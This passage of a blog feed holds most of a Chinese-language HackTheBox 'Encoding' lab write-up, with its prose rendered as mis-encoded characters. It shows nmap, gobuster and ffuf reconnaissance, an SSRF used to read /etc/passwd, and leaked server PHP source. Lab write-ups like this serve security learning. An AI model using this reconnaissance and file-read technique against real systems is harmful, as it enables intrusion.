&#125;</span><br><span class="line">            output.success(json_result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure><h3 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a><strong>è¿è¡Œç»“æœ</strong></h3><p><a href="https://pic.imgdb.cn/item/642beef86ea21b9a9e5832da.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beef86ea21b9a9e5832da.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[hackthebox]Encoding WriteUp</title>
      <link href="/2023/02/25/htbEncoding/"/>
      <url>/2023/02/25/htbEncoding/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™å°æœºå­æ‰“äº†å¥½å¤šå¤©ç»ˆäºæˆåŠŸget rootï¼Œæ‰“èµ·æ¥æ”¶è·æ»¡æ»¡ï¼Œåœ¨è¿™é‡Œåšä¸ªè¯¦ç»†çš„è®°å½•ã€‚ç›®å‰è¿˜æ˜¯Activeçš„æœºå­ï¼Œä»…ä½œè®°å½•ï¼Œå¸ˆå‚…ä»¬åˆ«ä¸¾æŠ¥æˆ‘-ã€‚-</p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>nmapæ‰«æç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€# nmap -sS -sV -sC -A -p- --min-rate 5000 10.10.11.198 </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 23:45 EST</span><br><span class="line">Nmap scan report for 10.10.11.198 (10.10.11.198)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-title: HaxTables</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.93%E=4%D=2/24%OT=22%CT=1%CU=41355%PV=Y%DS=2%DC=T%G=Y%TM=63F992A</span><br><span class="line">OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS</span><br><span class="line">OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1</span><br><span class="line">OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN</span><br><span class="line">OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A</span><br><span class="line">OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R</span><br><span class="line">OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F</span><br><span class="line">OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%</span><br><span class="line">OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD</span><br><span class="line">OS:=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 199/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   263.34 ms 10.10.14.1 (10.10.14.1)</span><br><span class="line">2   263.50 ms 10.10.11.198 (10.10.11.198)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 46.74 seconds</span><br></pre></td></tr></table></figure><p>è€æ ·å­ï¼Œlinuxæœºå™¨å¼€å¯22å’Œ80ç«¯å£ã€‚gobusteræ‰«æç›®å½•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€# gobuster dir -u http://10.10.11.198/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 -x php </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.4</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.11.198/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 200</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.4</span><br><span class="line">[+] Extensions:              php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/02/24 23:49:04 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 1999]</span><br><span class="line">/.php                 (Status: 403) [Size: 277]</span><br><span class="line">/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.198/assets/]</span><br><span class="line">/includes             (Status: 301) [Size: 315] [--&gt; http://10.10.11.198/includes/]</span><br><span class="line">/handler.php          (Status: 200) [Size: 38]</span><br><span class="line">/.php                 (Status: 403) [Size: 277]</span><br></pre></td></tr></table></figure><p>æ¥ç€è¿›å…¥ç«™ç‚¹ï¼Œå‘ç°æ­¤å¤„å­˜åœ¨å­åŸŸï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9ccf2f144a010073194d1.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9ccf2f144a010073194d1.jpg"></a></p><p>å†™å…¥åˆ°hosts:</p><p><a href="https://pic.imgdb.cn/item/63f9cd02f144a0100731b1fb.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd02f144a0100731b1fb.jpg"></a></p><p>æ¥ç€å°è¯•çˆ†ç ´å­åŸŸï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€# ffuf -H &quot;HOST:FUZZ.haxtables.htb&quot; -u http://haxtables.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 50  -fw &quot;246&quot;</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\       </span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="line">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="line"></span><br><span class="line">       v1.5.0 Kali Exclusive &lt;3</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://haxtables.htb</span><br><span class="line"> :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt</span><br><span class="line"> :: Header           : Host: FUZZ.haxtables.htb</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 50</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span><br><span class="line"> :: Filter           : Response words: 246</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">api                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1022ms]</span><br><span class="line">image                   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 263ms]</span><br><span class="line">:: Progress: [19966/19966] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:52] :: Errors: 0 :</span><br></pre></td></tr></table></figure><p>ä¸€å¹¶å†™å…¥åˆ°hostsä¸­ã€‚å°è¯•è®¿é—®image.haxtables.htbæ˜¾ç¤º403ï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cd11f144a0100731c7d3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd11f144a0100731c7d3.jpg"></a></p><p>æ¥ç€æˆ‘ä»¬ç»§ç»­æŸ¥çœ‹apiæ–‡æ¡£ï¼Œæ³¨æ„æ­¤å¤„ï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cd20f144a0100731daea.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd20f144a0100731daea.jpg"></a></p><p>çŒœæµ‹æ­¤å¤„å­˜åœ¨SSRFï¼Œå…ˆå°è¯•åœ¨æœ¬åœ°æ”¾ç½®ä¸€ä¸ª1.txtå¹¶æ‰§è¡Œå¦‚ä¸‹pythonç¨‹åºæŸ¥çœ‹ç»“æœï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cd31f144a0100731f4ff.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd31f144a0100731f4ff.jpg"></a></p><p>ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/63f9cd43f144a01007321625.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f9cd43f144a01007321625.jpg"></a></p><p>å‘ç°æˆåŠŸè¯»å–ï¼Œé‚£æˆ‘ä»¬è§£ç ä¸€ä¸‹å³å¯å¾—åˆ°&#x2F;etc&#x2F;passwdçš„å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€# echo $(python3 1.py|jq &quot;.data&quot;) &gt; 2.txt &amp;&amp; xxd -r -p 2.txt                  </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span class="line">uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br><span class="line">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">_laurel:x:998:998::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure><p>å°è¯•è¯»å–ä¸€ä¸‹åˆšåˆšçˆ†ç ´å‡ºæ¥çš„phpæ–‡ä»¶ï¼Œå³index.phpå’Œhandler.phpï¼Œindex.phpå†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;HaxTables&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;assets/css/main.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./assets/js/main.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=<span class="string">&quot;center&quot;</span>&gt;HaxTables&lt;/h1&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">nav</span> <span class="title">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">inverse</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">HaxTables</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">Home</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>-<span class="title">toggle</span>&quot; <span class="title">data</span>-<span class="title">toggle</span>=&quot;<span class="title">dropdown</span>&quot; <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">Convertions</span>&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">caret</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">dropdown</span>-<span class="title">menu</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">string</span>&quot;&gt;<span class="title">String</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">integer</span>&quot;&gt;<span class="title">Integer</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">image</span>&quot;&gt;<span class="title">Images</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;<span class="title">About</span> <span class="title">us</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">index</span>.<span class="title">php</span>?<span class="title">page</span>=<span class="title">api</span>&quot;&gt;<span class="title">API</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> (<span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;])) </span>&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;integer&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./includes/integer.html&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./includes/string.html&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;image&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./includes/image.html&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;api&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;./includes/api.html&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./includes/index.html&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;./includes/index.html&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>ä¸€äº›ç®€å•ä¸šåŠ¡å¤„ç†ï¼Œé‚£æŸ¥çœ‹ä¸€ä¸‹handler.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../api/utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jsondata</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$jsondata</span>[<span 